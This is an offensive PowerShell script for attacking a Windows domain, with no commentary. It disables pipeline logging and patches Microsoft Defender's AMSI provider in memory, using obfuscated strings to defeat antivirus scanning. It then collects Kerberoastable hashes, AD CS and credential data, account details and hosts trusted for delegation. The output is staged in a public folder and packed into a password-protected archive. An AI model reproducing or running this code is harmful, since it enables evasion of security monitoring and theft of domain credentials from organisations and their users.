[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$User = $env:UserName
$Domain = $env:USERDOMAIN
$ComputerName = $env:COMPUTERNAME

$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null)

mkdir C:\Users\Public\out
cd C:\Users\Public\out

Invoke-Cerberus -OutputFormat hashcat | % { $_.Hash } | fl | Out-File -Encoding ASCII  C:\Users\public\out\kcat.txt

Invoke-AppleDogPeas -Module ADCS -Outputfile C:\Users\Public\out\ADCS.txt

Invoke-AppleDogPeas -Module Creds -Scope Trusts -Outputfile C:\Users\Public\out\Creds-Trusts.txt

Invoke-AppleDogPeas -Module Creds -Outputfile C:\Users\Public\out\Creds.txt

Invoke-AppleDogPeas -Module Accounts -Outputfile C:\Users\Public\out\Accounts.txt

Get-DomainComputer -UACFilter TRUSTED_FOR_DELEGATION,SERVER_TRUST_ACCOUNT -Properties dnshostname | Out-File "C:\Users\Public\out\GDC-Trusted.txt"

Compress-Archive -Path "C:\Users\Public\out" -DestinationPath "C:\Users\Public\out.zip" -CompressionLevel Optimal -Force | Encrypt-Archive -DestinationPath "C:\Users\Public\out.zip" -Password (ConvertTo-SecureString -String "@ttck,c0mmun1tyFTW19012345" -AsPlainText -Force)